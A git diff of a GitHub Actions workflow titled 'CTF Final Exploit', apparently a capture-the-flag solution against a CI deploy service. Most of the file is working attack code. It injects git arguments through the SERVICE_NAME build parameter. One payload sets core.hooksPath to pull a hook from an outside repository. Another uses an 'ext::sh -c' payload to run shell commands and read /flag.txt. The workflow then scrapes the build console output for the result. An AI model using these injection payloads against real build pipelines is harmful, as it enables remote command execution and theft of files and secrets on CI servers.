@@ -1,4 +1,4 @@
-name: CTF Final Exploit
+﻿name: CTF Final Exploit
 on:
   push:
     branches: [ master ]
@@ -8,43 +8,19 @@ jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Get latest build number
+      - name: Exploit hooksPath
         run: |
-          echo "=== Current build list ==="
-          curl -sk https://gitops.ctfchile.com/job/deploy-service | grep -oP '#\d+' | head -5
-
-      - name: Exploit - --config hooksPath (exec hook on clone)
-        run: |
-          # The pipeline does: git clone https://github.com/pelicancorp/$SERVICE_NAME.git
-          # We inject: --config core.hooksPath=hooks.git https://github.com/chilectf/exploit
-          # chilectf/exploit has hooks.git/post-checkout that runs: cat /flag.txt >&2
-          echo "=== SENDING EXPLOIT ==="
           PAYLOAD='--config core.hooksPath=hooks.git https://github.com/chilectf/exploit'
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode "SERVICE_NAME=$PAYLOAD" \
-            -D - | tail -5
-          echo ""
-          echo "Sleeping 5s for build to complete..."
-          sleep 5
-
-      - name: Get console output of latest build
-        run: |
-          echo "=== Fetch latest build console ==="
-          # Get list to find new build number
+          curl -sk -X POST 'https://gitops.ctfchile.com/job/deploy-service/buildWithParameters' --data-urlencode "SERVICE_NAME=$PAYLOAD" -D - | tail -5
+          sleep 8
           PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
           LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
           echo "Latest build: #$LATEST"
-          echo ""
-          echo "=== Console output ==="
           curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console"
-
-      - name: Also try ext:: protocol
+      - name: Exploit ext protocol
         run: |
-          echo "=== ext:: protocol ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode "SERVICE_NAME=ext::sh -c cat /flag.txt >&2" \
-            -D - | tail -5
-          sleep 5
+          curl -sk -X POST 'https://gitops.ctfchile.com/job/deploy-service/buildWithParameters' --data-urlencode "SERVICE_NAME=ext::sh -c cat /flag.txt >&2" -D - | tail -5
+          sleep 8
           PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
           LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
           echo "Latest build: #$LATEST"
